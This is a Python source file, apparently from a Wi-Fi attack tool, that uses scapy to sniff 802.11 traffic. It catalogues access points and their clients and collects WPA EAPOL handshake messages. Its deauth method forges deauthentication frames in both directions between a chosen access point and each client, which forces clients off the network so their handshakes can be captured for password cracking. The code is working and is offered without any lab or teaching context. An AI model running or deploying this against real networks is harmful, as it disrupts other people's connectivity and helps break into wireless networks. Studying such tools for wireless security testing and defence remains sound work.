from scapy.all import *
from scapy.layers.eap import *
from scapy.layers.dot11 import *

import threading

from access_point import AccessPoint
from change_channel import *

class NetworkScanner():
    
    def __init__(self, interface_name, channel_table, start_channel):
        self.interface_name = interface_name
        self.channel_table = channel_table
        self.start_channel = start_channel
        self.access_points = []
        self.selected_ap = None

        # Access point MAC addresses
        self.ap_bssids = set()
        
        # BSSID:AccessPoint
        self.bssid_map = {}
        
        # SSID:AccessPoint
        self.ssid_map = {}

        self.sniff_thread = None
        self.deauth_thread = None
        self.channel_switch_thread = None

        self.stop_sniff = threading.Event()
        self.stop_changing_channel = threading.Event()
        self.stop_deauth = threading.Event()

        self.deauth_packet_count = 0
        self.max_packets = 0
        

    def handle_packet(self, pkt):
        """Handle different types of 802.11 frames"""

        # Handle beacon frames
        if pkt.haslayer(Dot11Beacon) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
            self.handle_beacon(pkt)

        # Handle EAPOL frame (handshake)
        elif pkt.haslayer(EAPOL):
            self.handle_eapol(pkt)

        # Handle probe requests
        elif pkt.haslayer(Dot11ProbeReq) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4:
            ssid = pkt[Dot11ProbeReq].info.decode()
            if ssid:
                ap = self.ssid_map.get(ssid)
                if ap and pkt[Dot11].addr2 not in ap.clients: 
                    ap.add_client(pkt[Dot11].addr2)

        # Handle association requests
        elif pkt.haslayer(Dot11AssoReq) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 0:
            source = pkt[Dot11].addr2
            bssid = pkt[Dot11].addr1
            if bssid in self.bssid_map and source not in self.bssid_map[bssid].clients:
                self.bssid_map[bssid].add_client(source)

        # Handle data frames
        elif pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
            match pkt[Dot11].subtype:
                # Data frame
                case 0:  
                    source = pkt[Dot11].addr2
                    destination = pkt[Dot11].addr1
                    self.process_client_data_frame(source, destination)

                # Null data frame
                case 4:
                    source = pkt[Dot11].addr2
                    destination = pkt[Dot11].addr3
                    self.process_client_data_frame(source, destination)

                # QoS data frame
                case 8:
                    source = pkt[Dot11].addr2
                    destination = pkt[Dot11].addr3
                    self.process_client_data_frame(source, destination)


    def handle_beacon(self, pkt):
        """Handle beacon frames"""

        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode()
        signal_strength = pkt[RadioTap].dBm_AntSignal
        channel = self.channel_table[pkt[RadioTap].Channel]

        # Some APs have hidden SSIDs
        if not ssid:
            ssid = 'HIDDEN SSID'

        if bssid not in self.ap_bssids:
            self.ap_bssids.add(bssid)
            ap = AccessPoint(ssid, bssid, signal_strength, channel, pkt)
            self.access_points.append(ap)
            self.bssid_map[bssid] = ap
            self.ssid_map[ssid] = ap
        else:
            self.bssid_map[bssid].update_signal_strength(signal_strength)


    def handle_eapol(self, pkt):
        """Process EAPOL packet, save key message type"""

        msg_type = pkt[EAPOL_KEY].guess_key_number()
        if pkt[Dot11].addr1 in self.bssid_map:
            self.bssid_map[pkt[Dot11].addr1].eapol_messages[msg_type] = pkt
        elif pkt[Dot11].addr2 in self.bssid_map:
            self.bssid_map[pkt[Dot11].addr2].eapol_messages[msg_type] = pkt
        elif pkt[Dot11].addr3 in self.bssid_map:
            self.bssid_map[pkt[Dot11].addr3].eapol_messages[msg_type] = pkt


    def process_client_data_frame(self, src, dest):
        if dest in self.bssid_map.keys() and dest != 'ff:ff:ff:ff:ff:ff':
                if src not in self.bssid_map[dest].clients:
                    self.bssid_map[dest].add_client(src)
    
    def deauth(self):
        """Craft and send deauthentication packets"""
        self.deauth_packet_count = 0
        self.max_packets = 10 * len(self.selected_ap.clients)
        while not self.deauth_packet_count >= self.max_packets:
            for client in self.selected_ap.clients:
                ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=self.selected_ap.bssid, addr2=client, addr3=self.selected_ap.bssid)/Dot11Deauth()
                client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=self.selected_ap.bssid, addr3=self.selected_ap.bssid)/Dot11Deauth()
                sendp(ap_to_client, iface=self.interface_name, verbose=False)
                self.deauth_packet_count += 1
                sendp(client_to_ap, iface=self.interface_name, verbose=False)
                self.deauth_packet_count += 1

    def start_sniffing(self, filter=''):
        sniff(
            iface=self.interface_name,
            prn=self.handle_packet,
            store=False,
            filter=filter,
            stop_filter=lambda x: self.stop_sniff.is_set()
            )
        
    def start_channel_hopping(self):
        change_channel(self.start_channel, self.interface_name, self.stop_changing_channel)

    def select_ap(self, ap):
        self.selected_ap = ap

    def lock_chnl(self):
        lock_channel(self.selected_ap.channel, self.interface_name)